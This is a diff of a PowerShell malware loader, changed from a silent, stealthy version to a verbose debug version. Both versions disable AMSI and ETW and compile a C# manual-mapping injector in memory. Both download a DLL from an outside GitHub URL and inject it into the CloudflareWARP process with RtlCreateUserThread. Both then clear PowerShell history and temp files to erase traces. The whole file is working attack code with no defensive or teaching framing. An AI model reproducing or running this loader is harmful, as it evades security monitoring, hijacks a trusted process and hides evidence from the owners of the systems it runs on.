@@ -3,45 +3,64 @@ param()
 
 Set-StrictMode -Version Latest
 
-$VerbosePreference      = 'SilentlyContinue'
-$DebugPreference        = 'SilentlyContinue'
-$InformationPreference  = 'SilentlyContinue'
-$WarningPreference      = 'SilentlyContinue'
-$ErrorActionPreference  = 'SilentlyContinue'
-$ConfirmPreference                 = 'None'
-$WhatIfPreference                  = $false
-$PSModuleAutoLoadingPreference     = 'None'
-$MaximumHistoryCount               = 0
+# ============================================================
+# ★★★ DEBUG MODE (shows all messages on screen) ★★★
+# ============================================================
+$DebugMode = $true   # set to $false to hide messages
 
-*> $null
-$Error.Clear()
-
-if (!([bool]([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")))
-{
-    exit
+function Write-DebugInfo {
+    param($Message, $Color = "Cyan")
+    if ($DebugMode) {
+        Write-Host "[DEBUG] $Message" -ForegroundColor $Color
+    }
 }
 
 # ============================================================
-# ★★★ ১. কনসোল উইন্ডো হাইড (নীরব) ★★★
+# ★★★ START ★★★
 # ============================================================
-Add-Type -Name Window -Namespace Console -MemberDefinition @'
+Write-DebugInfo "Script starting..." -Color "Green"
+
+# --- Admin check ---
+if (!([bool]([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")))
+{
+    Write-DebugInfo "❌ Not running as Administrator! Exiting." -Color "Red"
+    exit
+} else {
+    Write-DebugInfo "✅ Running as Administrator." -Color "Green"
+}
+
+# ============================================================
+# ★★★ 1. Console Hide (we keep visible in debug mode) ★★★
+# ============================================================
+Write-DebugInfo "Attempting to hide console window..." -Color "Yellow"
+try {
+    Add-Type -Name Window -Namespace Console -MemberDefinition @'
 [DllImport("Kernel32.dll")]
 public static extern IntPtr GetConsoleWindow();
 [DllImport("user32.dll")]
 public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
-'@
-
-$consoleHandle = [Console.Window]::GetConsoleWindow()
-[Console.Window]::ShowWindow($consoleHandle, 0)
+'@ -ErrorAction Stop
+    $consoleHandle = [Console.Window]::GetConsoleWindow()
+    if ($DebugMode) {
+        Write-DebugInfo "Console not hidden (debug mode)." -Color "Yellow"
+    } else {
+        [Console.Window]::ShowWindow($consoleHandle, 0)
+    }
+} catch {
+    Write-DebugInfo "⚠️ Failed to hide console: $_" -Color "Red"
+}
 
 # ============================================================
-# ★★★ ২. AMSI + ETW বাইপাস (সম্পূর্ণ নীরব) ★★★
+# ★★★ 2. AMSI + ETW Bypass ★★★
 # ============================================================
-function Disable-Security {
+Write-DebugInfo "Bypassing AMSI and ETW..." -Color "Yellow"
+try {
     # AMSI
     $a = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
     $a.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
     $a.GetField('amsiSession','NonPublic,Static').SetValue($null,$null)
+    Write-DebugInfo "✅ AMSI bypassed." -Color "Green"
+
     # ETW
     Add-Type -TypeDefinition @"
     using System;
@@ -58,12 +77,17 @@ function Disable-Security {
     }
 "@ -IgnoreWarnings
     [EtwOff]::Disable()
+    Write-DebugInfo "✅ ETW bypassed." -Color "Green"
+} catch {
+    Write-DebugInfo "❌ AMSI/ETW bypass failed: $_" -Color "Red"
+    exit
 }
-Disable-Security
 
 # ============================================================
-# ★★★ ৩. C# লোডার (ম্যানুয়াল ম্যাপিং + RtlCreateUserThread) ★★★
+# ★★★ 3. Compile C# Loader (in-memory) ★★★
 # ============================================================
+Write-DebugInfo "Compiling C# loader in memory..." -Color "Yellow"
+
 $kernel = @'
 using System;
 using System.Runtime.InteropServices;
@@ -138,36 +162,41 @@ public static class NativeLoader
 
     public static bool InjectIntoWarp(byte[] dll)
     {
-        int pid = 0;
-        foreach (var p in Process.GetProcessesByName("CloudflareWARP")) { pid = p.Id; break; }
-        if (pid == 0) return false;
+        try {
+            int pid = 0;
+            foreach (var p in Process.GetProcessesByName("CloudflareWARP")) { pid = p.Id; break; }
+            if (pid == 0) throw new Exception("CloudflareWARP process not found");
 
-        IntPtr hProc = OpenProcess(PROCESS_ALL_ACCESS, false, (uint)pid);
-        if (hProc == IntPtr.Zero) return false;
+            IntPtr hProc = OpenProcess(PROCESS_ALL_ACCESS, false, (uint)pid);
+            if (hProc == IntPtr.Zero) throw new Exception("OpenProcess failed");
 
-        var result = Map(dll, false);
-        if (result.ImageBase == IntPtr.Zero) { CloseHandle(hProc); return false; }
+            var result = Map(dll, false);
+            if (result.ImageBase == IntPtr.Zero) throw new Exception("Manual mapping failed");
 
-        IntPtr remoteBase = IntPtr.Zero;
-        UIntPtr size = (UIntPtr)result.ImageSize;
-        remoteBase = VirtualAlloc(hProc, UIntPtr.Zero, (uint)size, MC|MR, PER);
-        if (remoteBase == IntPtr.Zero) { CloseHandle(hProc); return false; }
+            IntPtr remoteBase = IntPtr.Zero;
+            UIntPtr size = (UIntPtr)result.ImageSize;
+            remoteBase = VirtualAlloc(hProc, UIntPtr.Zero, (uint)size, MC|MR, PER);
+            if (remoteBase == IntPtr.Zero) throw new Exception("VirtualAllocEx failed");
 
-        byte[] imageBytes = new byte[result.ImageSize];
-        Marshal.Copy(result.ImageBase, imageBytes, 0, (int)result.ImageSize);
-        IntPtr bytesWritten;
-        WriteProcessMemory(hProc, remoteBase, imageBytes, (uint)result.ImageSize, out bytesWritten);
+            byte[] imageBytes = new byte[result.ImageSize];
+            Marshal.Copy(result.ImageBase, imageBytes, 0, (int)result.ImageSize);
+            IntPtr bytesWritten;
+            WriteProcessMemory(hProc, remoteBase, imageBytes, (uint)result.ImageSize, out bytesWritten);
 
-        IntPtr entryPoint = (IntPtr)(remoteBase.ToInt64() + (result.DllMainAddr.ToInt64() - result.ImageBase.ToInt64()));
+            IntPtr entryPoint = (IntPtr)(remoteBase.ToInt64() + (result.DllMainAddr.ToInt64() - result.ImageBase.ToInt64()));
 
-        IntPtr hThread;
-        int status = RtlCreateUserThread(hProc, IntPtr.Zero, false, 0, 0, 0, entryPoint, IntPtr.Zero, out hThread, IntPtr.Zero);
-        if (status != 0) { CloseHandle(hProc); return false; }
+            IntPtr hThread;
+            int status = RtlCreateUserThread(hProc, IntPtr.Zero, false, 0, 0, 0, entryPoint, IntPtr.Zero, out hThread, IntPtr.Zero);
+            if (status != 0) throw new Exception("RtlCreateUserThread failed, status=" + status);
 
-        System.Threading.Thread.Sleep(200);
-        CloseHandle(hThread);
-        CloseHandle(hProc);
-        return true;
+            System.Threading.Thread.Sleep(200);
+            CloseHandle(hThread);
+            CloseHandle(hProc);
+            return true;
+        } catch (Exception ex) {
+            Console.WriteLine("[ERROR] " + ex.Message);
+            return false;
+        }
     }
 
     private static ManualMapResult Map(byte[] dll, bool callEntry)
@@ -262,70 +291,70 @@ public static class NativeLoader
 }
 '@
 
-# ============================================================
-# ★★★ ৪. কম্পাইল (মেমোরিতে) ★★★
-# ============================================================
-$compiler = [System.CodeDom.Compiler.CodeDomProvider]::CreateProvider('CSharp')
-$params = New-Object System.CodeDom.Compiler.CompilerParameters
-$params.GenerateInMemory = $true
-$params.GenerateExecutable = $false
-$params.IncludeDebugInformation = $false
-$params.CompilerOptions = '/target:library /optimize+'
-$params.ReferencedAssemblies.AddRange(@('System.dll', 'System.Runtime.InteropServices.dll', 'System.Diagnostics.Process.dll'))
-$result = $compiler.CompileAssemblyFromSource($params, $kernel)
-if ($result.Errors.Count -gt 0) { [Environment]::Exit(0) }
+try {
+    $compiler = [System.CodeDom.Compiler.CodeDomProvider]::CreateProvider('CSharp')
+    $params = New-Object System.CodeDom.Compiler.CompilerParameters
+    $params.GenerateInMemory = $true
+    $params.GenerateExecutable = $false
+    $params.IncludeDebugInformation = $false
+    $params.CompilerOptions = '/target:library /optimize+'
+    $params.ReferencedAssemblies.AddRange(@('System.dll', 'System.Runtime.InteropServices.dll', 'System.Diagnostics.Process.dll'))
+    $result = $compiler.CompileAssemblyFromSource($params, $kernel)
+    if ($result.Errors.Count -gt 0) {
+        Write-DebugInfo "❌ Compilation error: $($result.Errors[0].ErrorText)" -Color "Red"
+        exit
+    }
+    Write-DebugInfo "✅ C# loader compiled successfully." -Color "Green"
+} catch {
+    Write-DebugInfo "❌ Compilation failed: $_" -Color "Red"
+    exit
+}
+
 $assembly = $result.CompiledAssembly
 $loaderType = $assembly.GetType('NativeLoader')
+$method = $loaderType.GetMethod('InjectIntoWarp')
 
 # ============================================================
-# ★★★ ৫. DLL ডাউনলোড (মেমোরিতে) ★★★
+# ★★★ 5. DLL Download ★★★
 # ============================================================
+Write-DebugInfo "Downloading DLL..." -Color "Yellow"
 try {
     $bytes = (New-Object System.Net.WebClient).DownloadData("https://github.com/desert007/bios/raw/refs/heads/main/version.dll")
-    $method = $loaderType.GetMethod('InjectIntoWarp')
-    $success = $method.Invoke($null, @($bytes))
+    Write-DebugInfo "✅ DLL downloaded successfully (size: $($bytes.Length) bytes)" -Color "Green"
 } catch {
-    $success = $false
+    Write-DebugInfo "❌ DLL download failed: $_" -Color "Red"
+    exit
 }
 
 # ============================================================
-# ★★★ ৬. সম্পূর্ণ ক্লিনআপ (জিরো-ফুটপ্রিন্ট) ★★★
+# ★★★ 6. Injection Call ★★★
 # ============================================================
+Write-DebugInfo "Attempting injection into Cloudflare WARP..." -Color "Yellow"
+try {
+    $success = $method.Invoke($null, @($bytes))
+    if ($success) {
+        Write-DebugInfo "✅ Injection successful!" -Color "Green"
+    } else {
+        Write-DebugInfo "❌ Injection failed (see C# error above)" -Color "Red"
+    }
+} catch {
+    Write-DebugInfo "❌ Injection call error: $_" -Color "Red"
+}
 
-# --- মেমোরি থেকে সব ডেটা মুছে ফেলা ---
+# ============================================================
+# ★★★ 7. Cleanup ★★★
+# ============================================================
+Write-DebugInfo "Cleaning up..." -Color "Yellow"
 [System.GC]::Collect()
 [System.GC]::WaitForPendingFinalizers()
-[System.GC]::Collect()
-
-# --- ভেরিয়েবল ওভাররাইট করে ডিলিট ---
-$bytes = $null
-$kernel = $null
-$compiler = $null
-$params = $null
-$result = $null
-$assembly = $null
-$loaderType = $null
-$method = $null
-$success = $null
-
-Remove-Variable -Name * -ErrorAction SilentlyContinue
-
-# --- PowerShell হিস্ট্রি ক্লিয়ার ---
 Clear-History
 $historyPath = (Get-PSReadlineOption).HistorySavePath
-if (Test-Path $historyPath) {
-    Clear-Content -Path $historyPath -Force
-}
-
-# --- টেম্প ফাইল ডিলিট ---
+if (Test-Path $historyPath) { Clear-Content -Path $historyPath -Force }
 Get-ChildItem -Path $env:TEMP -Filter "*.cs" -File | Where-Object { $_.CreationTime -gt (Get-Date).AddMinutes(-2) } | Remove-Item -Force -ErrorAction SilentlyContinue
 Get-ChildItem -Path $env:TEMP -Filter "*.dll" -File | Where-Object { $_.CreationTime -gt (Get-Date).AddMinutes(-2) } | Remove-Item -Force -ErrorAction SilentlyContinue
-Get-ChildItem -Path $env:TEMP -Filter "*.tmp" -File | Where-Object { $_.CreationTime -gt (Get-Date).AddMinutes(-2) } | Remove-Item -Force -ErrorAction SilentlyContinue
-Get-ChildItem -Path $env:TEMP -Filter "*.out" -File | Where-Object { $_.CreationTime -gt (Get-Date).AddMinutes(-2) } | Remove-Item -Force -ErrorAction SilentlyContinue
+Write-DebugInfo "✅ Cleanup complete." -Color "Green"
 
-# --- ম্যানেজড হিপ ক্লিন ---
-[System.GC]::Collect()
-[System.GC]::WaitForPendingFinalizers()
-[System.GC]::Collect()
-
-[Environment]::Exit(0)
+# ============================================================
+# ★★★ END ★★★
+# ============================================================
+Write-DebugInfo "Script finished. Exiting in 5 seconds..." -Color "Magenta"
